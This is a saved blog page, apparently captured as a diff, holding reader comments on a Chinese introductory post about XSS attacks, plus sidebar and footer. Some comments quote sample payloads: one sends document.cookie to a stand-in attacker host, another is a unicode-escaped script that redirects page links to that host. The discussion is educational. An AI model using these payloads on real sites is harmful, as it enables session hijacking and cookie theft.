+			<h5>
+				<cite><a href="#3014803" class="layer">#5楼</a><a name="3014803" id="comment_anchor_3014803"></a></cite> <a id="a_comment_author_3014803" href="http://www.cnblogs.com/NorthFish/" target="_blank">NorthFish</a> <a href="http://msg.cnblogs.com/send/NorthFish" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2014-08-22 15:07</span></small>
+			</h5>
+			<div id="comment_body_3014803" class="blog_comment_body">&lt;a href=# onclick=\"document.location=\'<a href="http://attacker-site.com/xss.php?c" target="_blank">http://attacker-site.com/xss.php?c</a>=\'+escape\(document.cookie\)\;\"&gt;bangerlee&lt;/a&gt;<br><br>请教一下，这一步怎么能够获取到 session id 呢，只是获取到了cookie啊。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3014803,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3014803,'Bury',this)">反对(0)</a></div><span id="comment_3014803_avatar" style="display:none;">http://pic.cnblogs.com/face/u354790.jpg?id=26125640</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3139807" class="layer">#6楼</a><a name="3139807" id="comment_anchor_3139807"></a></cite> <a id="a_comment_author_3139807" href="http://home.cnblogs.com/u/175017/" target="_blank">C#菜子</a> <a href="http://msg.cnblogs.com/send/C%23%E8%8F%9C%E5%AD%90" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-03-12 17:45</span></small>
+			</h5>
+			<div id="comment_body_3139807" class="blog_comment_body">有用，非常感谢！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3139807,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3139807,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3142255" class="layer">#7楼</a><a name="3142255" id="comment_anchor_3142255"></a></cite> <a id="a_comment_author_3142255" href="http://www.cnblogs.com/zechau/" target="_blank">zechau</a> <a href="http://msg.cnblogs.com/send/zechau" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-03-16 22:10</span></small>
+			</h5>
+			<div id="comment_body_3142255" class="blog_comment_body"><a href="#3014803" title="查看所回复的评论" onclick="commentManager.renderComments(0,50,3014803);">@</a>NorthFish<br>session_id 存在cookie里</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3142255,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3142255,'Bury',this)">反对(0)</a></div><span id="comment_3142255_avatar" style="display:none;">http://pic.cnblogs.com/face/497833/20151009105607.png</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3148100" class="layer">#8楼</a><a name="3148100" id="comment_anchor_3148100"></a></cite> <a id="a_comment_author_3148100" href="http://www.cnblogs.com/zquancai/" target="_blank">进击的小矮人</a> <a href="http://msg.cnblogs.com/send/%E8%BF%9B%E5%87%BB%E7%9A%84%E5%B0%8F%E7%9F%AE%E4%BA%BA" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-03-25 09:58</span></small>
+			</h5>
+			<div id="comment_body_3148100" class="blog_comment_body">简明易懂~~~</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3148100,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3148100,'Bury',this)">反对(0)</a></div><span id="comment_3148100_avatar" style="display:none;">http://pic.cnblogs.com/face/677244/20141016224458.png</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3256740" class="layer">#9楼</a><a name="3256740" id="comment_anchor_3256740"></a></cite> <a id="a_comment_author_3256740" href="http://home.cnblogs.com/u/804713/" target="_blank">heshuxian</a> <a href="http://msg.cnblogs.com/send/heshuxian" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-08-29 20:50</span></small>
+			</h5>
+			<div id="comment_body_3256740" class="blog_comment_body">&lt;script&gt;alert("test");&lt;/script&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3256740,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3256740,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3272471" class="layer">#10楼</a><a name="3272471" id="comment_anchor_3272471"></a></cite> <a id="a_comment_author_3272471" href="http://www.cnblogs.com/thomson/" target="_blank">一手沙发</a> <a href="http://msg.cnblogs.com/send/%E4%B8%80%E6%89%8B%E6%B2%99%E5%8F%91" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-09-23 11:52</span></small>
+			</h5>
+			<div id="comment_body_3272471" class="blog_comment_body">写的不错，通俗易懂又不失深度</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3272471,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3272471,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3285137" class="layer">#11楼</a><a name="3285137" id="comment_anchor_3285137"></a></cite> <a id="a_comment_author_3285137" href="http://www.cnblogs.com/wangjinnan/" target="_blank">wangjinnan</a> <a href="http://msg.cnblogs.com/send/wangjinnan" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-10-15 11:25</span></small>
+			</h5>
+			<div id="comment_body_3285137" class="blog_comment_body"><a href="https://blog.wilddog.com/?p" target="_blank">https://blog.wilddog.com/?p</a>=290<br>这篇文章写得很全面，也可以看一下</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3285137,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3285137,'Bury',this)">反对(0)</a></div><span id="comment_3285137_avatar" style="display:none;">http://pic.cnblogs.com/face/794450/20150805120517.png</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#3307427" class="layer">#12楼</a><a name="3307427" id="comment_anchor_3307427"></a><span id="comment-maxId" style="display:none;">3307427</span><span id="comment-maxDate" style="display:none;">2015/11/16 15:20:42</span></cite> <a id="a_comment_author_3307427" href="http://www.cnblogs.com/kllay/" target="_blank">kllay</a> <a href="http://msg.cnblogs.com/send/kllay" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2015-11-16 15:20</span></small>
+			</h5>
+			<div id="comment_body_3307427" class="blog_comment_body">%用\u00<br>\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0077\u0069\u006e\u0064\u006f\u0077\u002e\u006f\u006e\u006c\u006f\u0061\u0064\u0020\u003d\u0020\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0028\u0029\u0020\u007b\u0076\u0061\u0072\u0020\u006c\u0069\u006e\u006b\u003d\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0054\u0061\u0067\u004e\u0061\u006d\u0065\u0028\u0022\u0061\u0022\u0029\u003b\u006c\u0069\u006e\u006b\u005b\u0030\u005d\u002e\u0068\u0072\u0065\u0066\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u0074\u0074\u0061\u0063\u006b\u0065\u0072\u002d\u0073\u0069\u0074\u0065\u002e\u0063\u006f\u006d\u002f\u0022\u003b\u007d\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e<br><br><a href="http://tool.chinaz.com/Tools/native_ascii.aspx" target="_blank">http://tool.chinaz.com/Tools/native_ascii.aspx</a> 反相查询为<br>&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="<a href="http://attacker-site.com/" target="_blank">http://attacker-site.com/</a>";}&lt;/script&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3307427,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3307427,'Bury',this)">反对(0)</a></div><span id="comment_3307427_avatar" style="display:none;">http://pic.cnblogs.com/face/602179/20150914174107.png</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+</ol>
+
+<div id="comments_pager_bottom"></div></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id="comment_form" class="commentform">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"><div class="login_tips">注册用户登录后才能发表评论，请 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login('commentform');">登录</a> 或 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，<a href="http://www.cnblogs.com/">访问</a>网站首页。</div></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="site_nav_under"><a href="http://www.ucancode.com/index.htm" target="_blank">【推荐】50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库</a><br><a href="http://www.rongcloud.cn/" target="_blank">【推荐】融云即时通讯云－专注为 App 开发者提供IM云服务</a><br><a href="https://www.jpush.cn/" target="_blank">【推荐】极光推送30多万开发者的选择，SDK接入量超过30亿了，你还没注册？</a><br><a href="http://click.aliyun.com/m/994/" target="_blank">【精品】根据网站PV推荐完整架构方案</a><br></div>
+<div id="opt_under_post"></div>
+<script type="text/javascript">
+    fixPostBodyFormat();
+</script>
+<div id="google_ad_c1" class="c_ad_block"><a href="http://www.gcpowertools.com.cn/products/spreadjs/?utm_source=cnblogs&amp;utm_medium=blogpage&amp;utm_term=bottom&amp;utm_content=SpreadJS&amp;utm_campaign=community" target="_blank"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/24442-20151030141724685-1469547474.png" alt="" title="" height="250" width="300"></a></div>
+<div id="under_post_news"><div class="itnews c_ad_block"><b>最新IT新闻</b>:<br> ·  <a href="http://news.cnblogs.com/n/534328/" target="_blank">110.5亿！首旅全资收购如家，华住小赚一笔</a><br> ·  <a href="http://news.cnblogs.com/n/534325/" target="_blank">微软商城启动“8日惊喜”活动启动 Lumia 950/XL双机预售</a><br> ·  <a href="http://news.cnblogs.com/n/534324/" target="_blank">可“触摸”全息图技术面世 将用于医学领域</a><br> ·  <a href="http://news.cnblogs.com/n/534323/" target="_blank">苹果软件高管：编程是有学识的下一个层次</a><br> ·  <a href="http://news.cnblogs.com/n/534322/" target="_blank">全球最著名测网速站点终于要抛弃Flash了</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div></div>
+<div id="google_ad_c2" class="c_ad_block"><a href="http://e.jikexueyuan.com/html5.html?hmsr=cnb_banner_html5_09.14" target="_blank"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/24442-20150914101329570-406117032.jpg" alt="" title="" height="60" width="468"></a></div>
+<div id="under_post_kb"><div class="itnews c_ad_block" id="kb_block"><b>最新知识库文章</b>:<br><div id="kb_recent"> ·  <a href="http://kb.cnblogs.com/page/533407/" target="_blank">程序员的思考：分享即提高</a><br> ·  <a href="http://kb.cnblogs.com/page/527814/" target="_blank">从涂鸦到发布——理解API的设计过程</a><br> ·  <a href="http://kb.cnblogs.com/page/531834/" target="_blank">好的架构是进化来的，不是设计来的</a><br> ·  <a href="http://kb.cnblogs.com/page/532236/" target="_blank">被误解的MVC和被神化的MVVM</a><br> ·  <a href="http://kb.cnblogs.com/page/530046/" target="_blank">再谈设计和编码</a><br></div>» <a href="http://kb.cnblogs.com/" target="_blank">更多知识库文章...</a></div></div>
+<div id="HistoryToday" class="c_ad_block"></div>
+<script type="text/javascript">
+$(function () {
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 200);
+});
+</script>
+</div>
+
+        </div>
+
+        <script type="text/javascript">
+            var m = window.__blog.contentRendered;
+            if (m) { m(__$("content")); }
+        </script>
+
+        <div id="sidebar">
+            
+<div id="about">
+<div>
+<h2 id="about_title">About</h2>
+<div id="about_body">
+<div id="blog-news"><a href="http://weibo.com/u/1727492133?s=6uyXnP" target="_blank"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/5.png" border="0"></a>
+<p><b>基本信息</b></p>
+<p>2011年                毕业于中山大学软件学院</p>
+<p>2011年 ~ 2013年 华为软件技术有限公司，系统运维</p>
+<p>2013年至今          腾讯，微信业务运维</p><p></p><div id="profile_block">昵称：<a href="http://home.cnblogs.com/u/bangerlee/">bangerlee</a><br>园龄：<a href="http://home.cnblogs.com/u/bangerlee/" title="入园时间：2010-03-01">5年9个月</a><br>粉丝：<a href="http://home.cnblogs.com/u/bangerlee/followers/">184</a><br>关注：<a href="http://home.cnblogs.com/u/bangerlee/followees/">0</a><div id="p_b_follow"><a href="javascript:void(0);" onclick="cnblogs.UserManager.FollowBlogger('653d7858-f024-df11-ba8f-001cf0cd104b')">+加关注</a></div></div></div>
+<script type="text/javascript">loadBlogNews();</script>
+</div>
+</div>
+</div>
+
+            <script type="text/javascript">
+                var m = window.__blog.aboutRendered;
+                if (m) { m(__$("about")); }
+            </script>
+            
+<div id="mySearchWrapper">
+    <div id="mySearch">
+        <input src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/btnsearch.gif" id="btnZzk" class="submit" onclick="zzk_go();return false;" type="image">
+        <label class="lb_search"><input id="q" onkeydown="return zzk_go_enter(event);" class="keyword" type="text"></label>
+    </div>
+</div>
+
+            <script type="text/javascript">
+                var m = window.__blog.searchFormRendered;
+                if (m) { m(__$("searchform")); }
+            </script>
+            <div id="sideMain">
+            <div id="side-recent-comments">
+        <h2>最新评论</h2>
+        <ul class="voice">
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3307427">Re:xss攻击入门</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3307427">
+                        %用\u00\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0077\u0069\u006e\u0064\u006f\u0077\u002e\u00......
+                        -- kllay
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2012/04/30/2476190.html#3302036">Re:如何使用strace+pstack利器分析程序性能</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2012/04/30/2476190.html#3302036">
+                        你好，请问本文中使用的server/client程序和pstack脚本 能否提供下 文章里的链接已经无法访问了  多谢
+                        -- chengeng29
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3285137">Re:xss攻击入门</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3285137">
+                        </a><a href="" target="_blank"></a>=290<br>这篇文章写得很全面，也可以看一下
+                        -- wangjinnan
+                    
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3272471">Re:xss攻击入门</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3272471">
+                        写的不错，通俗易懂又不失深度
+                        -- 一手沙发
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3256740">Re:xss攻击入门</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html#3256740">
+                        &lt;script&gt;alert("test");&lt;/script&gt;
+                        -- heshuxian
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html#3226200">Re:内存池的实现(二)</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html#3226200">
+                        @ChrisXue原文已修改，谢谢指正 :)...
+                        -- bangerlee
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2012/08/30/2659435.html#3225834">Re:谁动了我的cpu——oprofile使用札记</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2012/08/30/2659435.html#3225834">
+                        @fandyst请问opcontrol的问题你是怎么解决的，我在编译安装后也遇到了相同的问题，ophelp等其他命令都有，但就是没有opcontrol...
+                        -- vanpenbo
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html#3225229">Re:内存池的实现(二)</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html#3225229">
+                        boundary必须保证为2的“幂”才对，如果只是2的倍数，比如6，是不能套用APR_ALIGN来对齐的
+                        -- ChrisXue
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html#3189733">Re:内存池的实现(一)</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html#3189733">
+                        楼主可以到github.com开个项目，肯定能惠及很多人
+                        -- 星空一鳖
+                    </a>
+                </li>
+                <li>
+                    <a href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html#3171639">Re:内存池的实现(一)</a>
+                    <br>
+                    <a class="child" href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html#3171639">
+                        想学习一下内存池实现源码，求发我一份<br>邮箱：lxbwin@163.com
+                        -- 晴天#
+                    </a>
+                </li>
+        </ul>
+    </div></div>
+            <div id="sideRight">
+                
+    
+
+
+</div>
+            <div id="sideLeft">
+            <div id="side-categories">
+        <h2>随笔分类</h2>
+        <ul class="folder">
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/326049.html">gtest(5)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/385741.html">hack(2)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/344720.html">linux(6)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/668963.html">NoSql(4)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/382404.html">编程(11)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/668967.html">分布式系统(8)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/346564.html">年终回顾(3)</a>
+                </li>
+                <li>
+                    
+                    <a href="http://www.cnblogs.com/bangerlee/category/668969.html">运维(8)</a>
+                </li>
+        </ul>
+    </div><div id="side-top-posts-custom">
+    <h2>推荐排行榜</h2>
+    <div id="TopDiggPostsBlock"><ul><li><a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">1. xss攻击入门(15)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/05/22/2508772.html">2. 函数调用过程探究(13)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/12/30/2301031.html">3. 回顾2011——一个程序员工作半年后的自白(11)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/06/04/2532674.html">4. 一次Linux服务器被hack的过程分析(10)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2013/02/27/2935422.html">5. 9个常用iptables配置实例(8)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/03/03/2372370.html">6. Linux故障处理最佳实践(6)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html">7. 内存池的实现(一)(6)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/09/07/2166593.html">8. 代码静态分析工具——splint的学习与使用(6)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html">9. 内存池的实现(二)(5)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/12/30/2833123.html">10. 回顾2012——运维工作周年祭(5)</a></li></ul></div>
+</div><div id="side-top-posts">
+    <h2>阅读排行榜</h2>
+    <div id="TopViewPostsBlock"><ul><li><a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">1. xss攻击入门(50419)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/08/31/2161421.html">2. 内存池的实现(一)(27204)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2013/02/27/2935422.html">3. 9个常用iptables配置实例(26310)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/09/07/2166593.html">4. 代码静态分析工具——splint的学习与使用(22869)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/08/30/2659435.html">5. 谁动了我的cpu——oprofile使用札记(18147)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/10/02/2197879.html">6. Google C++单元测试框架(Gtest)系列教程之一——入门(14919)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/05/22/2508772.html">7. 函数调用过程探究(14447)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/12/23/2294090.html">8. Linux系统与程序监控工具atop教程(13284)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2012/04/30/2476190.html">9. 如何使用strace+pstack利器分析程序性能(12391)</a></li><li><a href="http://www.cnblogs.com/bangerlee/archive/2011/09/18/2178172.html">10. 代码度量工具——SourceMonitor的学习和使用(12160)</a></li></ul></div>
+</div></div>
+            
+                <div id="sideContainer"></div>
+                <script type="text/javascript">
+                    $.ajax({
+                        url: '/' + currentBlogApp + '/mvc/blog/Minyx2_Lite_SideColumn.aspx',
+                        data: '{}',
+                        type: 'post',
+                        dataType: 'text',
+                        contentType: 'application/json; charset=utf-8',
+                        success: function (data) {
+                            if (data) {
+                                $("#sideContainer").html(data);
+                                loadBlogDefaultCalendar();
+                                loadBlogSideBlocks();
+                                var m = window.__blog.sideContainerRendered;
+                                if (m) { m(__$("sideContainer")); }
+                                window.__blog.sidebar.__layout();
+                            }
+                        }
+                    });
+
+                </script>
+            
+        </div>
+
+        <script type="text/javascript">
+            var m = window.__blog.sidebarRendered;
+            if (m) { m(__$("sidebar")); }
+        </script>
+
+        <div id="footer">
+            
+<p id="logoFoot">
+    <a href="http://www.spiga.com.mx/" title="Agencia Interactiva Spiga">www.spiga.com.mx</a>
+</p>
+<div class="footText">
+<p>
+Copyright ©2015 bangerlee
+</p>
+<p>
+<a href="http://www.cnblogs.com/">博客园</a>
+</p>
+</div>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        var m = window.__blog.wrapperRendered;
+        if (m) { m(__$("wrapper")); }
+    </script>
+
+</div>
+<script type="text/javascript">
+    var m = window.__blog.containerRendered;
+    if (m) { m(__$("container")); }
+</script>
+<!--PageEndHtml Block Begin-->
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1254603060'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1254603060%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script><span id="cnzz_stat_icon_1254603060"><a href="http://www.cnzz.com/stat/website.php?web_id=1254603060" target="_blank" title="站长统计"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/pic.gif" border="0" hspace="0" vspace="0"></a></span><script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/z_stat.php" type="text/javascript"></script><script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/core.php" charset="utf-8" type="text/javascript"></script>
+<!--PageEndHtml Block End-->
+
+
+</body></html>
